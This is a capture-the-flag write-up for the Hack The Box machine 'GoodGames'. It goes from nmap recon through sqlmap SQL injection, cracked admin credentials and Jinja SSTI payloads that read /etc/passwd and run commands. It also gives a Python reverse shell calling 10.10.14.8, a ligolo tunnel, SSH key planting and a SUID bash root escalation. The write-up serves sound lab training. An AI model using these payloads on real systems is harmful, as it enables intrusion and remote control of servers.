---
title: 'HTB-GoodGames'
published: 2025-09-18
draft: false
toc: true
---
**Start 12:07 28-10-2025**

---
```
Scope:
10.10.11.130
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- -vvvv -T5 --min-rate=5000 -Pn 10.10.11.130

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Werkzeug httpd 2.0.2 (Python 3.9.2)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET POST
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-title: GoodGames | Community and Store
```

## 80/TCP - HTTP

The site seems to be running on `python`, meaning it's LIKELY a **Flask** or **Django** instance.

![](attachments/df45afff31aee7aa22e1d9d8cda7271f.png)

![](attachments/3b647c62cc64115920d5eee564db46c8.png)

`wappalyzer` tells us it's running on **Flask 2.0.2**.

I went ahead and tested the functionality of the website such as the sign up page:

![](attachments/d3f2ffb30454fe4c8eadbd5aff7a9d26.png)

![](attachments/65154e413e508ac56d0a0c52381f2c10.png)

![](attachments/547060ce3c9120af4c6989907c4d3b48.png)

I analysed the requests in `burp`:

![](attachments/3ddf09225632f218684d55d27f293a2d.png)

The cookie looks like a JWT token:

![](attachments/9020155fe7e43849d364af7feb68a315.png)

Other than that I didn't find anything so I started off by automating some testing.

# Exploitation
## SQLi

I went ahead and tested some of the `POST` requests like the password reset and such using `sqlmap` until one of them worked:

![](attachments/a8aa6aaf757c1b3cbbb05b801a983f7b.png)

![](attachments/9aafd6f12997284d87d21d09742d8859.png)

![](attachments/87d2987ce94e859e4b9ca219393507e3.png)

![](attachments/7d808a0ca4c87d6e5ccb6ba400ca7848.png)

I cracked this password using crackstation

![](attachments/06b9754df17303456b85261dcadd6671.png)

```
admin@goodgames.htb
superadministrator
```

![](attachments/f62340399af6d499cd49836ee22f18c3.png)

![](attachments/4ec23f61a90864184503f6328007aeb1.png)

This time a new Icon appeared:

![](attachments/743f63752b5530dc59dcc91285f36136.png)

Clicking on it redirects us to another vhost:

![](attachments/d4b5fde3a9b5796c1670026330f24b60.png)

![](attachments/cf83c62045ab0eb1a269cde9a9cbb5ae.png)

## internal-administration.goodgames.htb

![](attachments/468a00b8858efc23eda422d75f9b8523.png)

I can log in with the previously found creds:

![](attachments/608866cf43d19afb1d78cfd4dc76d518.png)

## SSTI

However since this is **Flask** I tried out to exploit a **SSTI** vulnerability:

![](attachments/881748186dd96a345e9302823122b460.png)

![](attachments/3238061c474f6e4cdbd98385ff3bceb2.png)

It worked since this is the expected output of the `jinja` templating language.

>[!note]
>The result will enable us to deduce the template engine used by the web application. In Jinja, the result will beÂ `7777777`, while in Twig for example, the result will beÂ `49`. Since this application is running on **Flask** though, `jinja` is the only viable option here.

We can start testing various payloads, the following for example outputs the web application's configuration:

```python
{{ config.items() }}
```

![](attachments/f1cdd84fc9fa436b5fa072fd65b3eef7.png)

We can use the following to achieve **LFI**:

```python
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

![](attachments/33141927d6fff6da3217cab634e6709e.png)

And we can even achieve **RCE** by importing the `os` library.

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami;id').read() }}
```

![](attachments/b86eb935fcbe4ca7fb80f623cf74cfac.png)

Well that's convenient! However after some further testing I found out that this instance is running from a `docker` container:

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ip a').read() }}
```

![](attachments/dc67a3fa04142b5ba9f5c17b6091f235.png)

This is verified using the following payload:

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}
```

![](attachments/bc87d9ccb48eb06e482524705ea55aca.png)

# Foothold
## Docker shell as root

With the use of the following payload I got myself a reverse shell into the `docker` container:

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.8\",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}
```

![](attachments/716906f1c2fff22c19b7894ff752f3e7.png)

However I can still get the `user.txt` flag easily.

### user.txt

![](attachments/7e7131632d32402df2bea94568b88cf1.png)

The `root.txt` flag however is not present:

![](attachments/061d3de44c00261f146f7cb7f4bd332d.png)

# Docker Escape
## Ligolo-ng

Since the *augustus* user is mounted here we can try to upload our `ssh` key to their `.ssh` directory in order to get a foothold that way. 
In order to do this though we need to set up a `ligolo` port forward first since the `22` port isn't open to the outside.

```bash
nohup ./agent -connect 10.10.14.8:11601 -ignore-cert >/dev/null 2>&1 &
```

![](attachments/20440b35fa1ae79f1ed0cdbd76ced73d.png)

![](attachments/876476e01f2cab6d634be96c7bbc1ded.png)

![](attachments/7e4453135334873bd0de1b5efeffd60e.png)

Next up we transfer the `id_rsa.pub`:

![](attachments/4dddddfc9cd069727c70cc887cc69ab2.png)

![](attachments/d3273b8da308e47361f597b168c20704.png)

## Shell as augustus

Now it's as easy as pie:

![](attachments/99a3835b248ba5781cd3def2ef756c8f.png)

![](attachments/0528665714b12144e1fd161cd3b4f56b.png)

We notice that we've successfully escaped the docker container.

# Privilege Escalation

1. From the `ssh` host we will copy over the `bash` binary:

![](attachments/258f1bbd52d735449916f26966417576.png)

2. From the `docker` container we will modify the permissions on the binary:

![](attachments/f7e63ffd876c2dd58d86506b0703523b.png)

3. Profit

![](attachments/4ac465804bcaa7da05c261653d82cf37.png)

## root.txt

![](attachments/a8587e6c3d99ec35755492053e29eef5.png)

![](attachments/1701d2f190f518cf421a30f20a226c1f.png)

---

**Finished 14:00 28-10-2025**

[^Links]: [[Hack The Box]]

#docker-escape #docker #SSTI #SQLi #sqlmap 
